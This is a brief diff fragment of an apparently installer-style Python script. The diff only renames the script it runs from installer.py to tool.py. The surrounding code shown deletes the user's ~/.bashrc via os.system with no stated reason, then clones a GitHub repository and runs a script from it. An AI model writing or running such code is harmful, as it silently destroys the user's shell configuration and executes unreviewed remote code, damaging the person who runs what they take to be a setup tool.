@@ -15,4 +15,4 @@ print(Fore.WHITE+"")
 
 os.system('rm ~/.bashrc')
 
-os.system('git clone https://github.com/777-FOXik-777/installer && cd installer && python installer.py')
+os.system('git clone https://github.com/777-FOXik-777/installer && cd installer && python tool.py')
